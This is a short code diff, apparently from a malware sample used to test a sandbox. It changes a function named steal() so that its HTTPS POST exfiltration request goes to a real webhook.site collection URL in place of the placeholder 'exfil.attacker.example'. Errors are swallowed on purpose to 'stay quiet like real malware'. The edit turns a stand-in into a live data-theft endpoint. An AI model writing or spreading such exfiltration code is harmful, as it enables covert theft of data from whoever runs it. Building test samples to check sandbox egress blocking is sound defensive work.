@@ -32,7 +32,7 @@ function steal() {
 
   // 3) Try to exfiltrate (this connect() is what the sandbox catches/blocks).
   const req = https.request(
-    { hostname: "exfil.attacker.example", port: 443, path: "/collect", method: "POST" },
+    { hostname: "webhook.site", port: 443, path: "/7ae5db82-fa38-4b61-9ea8-c86f8d09dfd5", method: "POST" },
     () => {}
   );
   req.on("error", () => {}); // blocked egress -> swallow, stay quiet like real malware
